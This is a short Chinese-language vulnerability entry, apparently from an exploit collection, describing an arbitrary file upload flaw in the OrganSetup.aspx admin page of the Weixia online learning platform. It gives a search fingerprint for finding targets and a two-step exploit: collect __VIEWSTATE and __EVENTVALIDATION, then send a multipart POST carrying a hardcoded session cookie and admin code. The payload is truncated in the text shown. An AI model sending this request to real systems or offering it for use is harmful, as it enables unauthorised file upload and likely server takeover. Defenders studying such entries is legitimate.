# 微厦在线学习平台OrganSetup存在任意文件上传漏洞

- **系统**：微厦在线学习平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Utility/CoreScripts/Widget.js"`
- **请求**：`GET /Manage/Admin/OrganSetup.aspx HTTP/1.1`

**请求体 / payload**
```
1.获取`__VIEWSTATE`和`__EVENTVALIDATION`
Host:
2.通过上一步获取的`__VIEWSTATE`和`__EVENTVALIDATION`替换后，上传文件
POST /Manage/Admin/OrganSetup.aspx HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=---------------------------286092866711427024533444908228
Content-Length: 3614
Cookie: stOnlineNumx=189; ASP.NET\_SessionId=opim4u53mjzvbgoljz2haqwb; admincode=4cdcf18ba72a7b28dc405b992f8cddcd
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="\_\_VIEWSTATE"
/wEPDwUJNDA4NTQ0MTE3D2QWAmYPZBYCAgMQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ9kFggCAQ8PFgIeBFRl…（脚本共 3957 字，完整版见原文）
```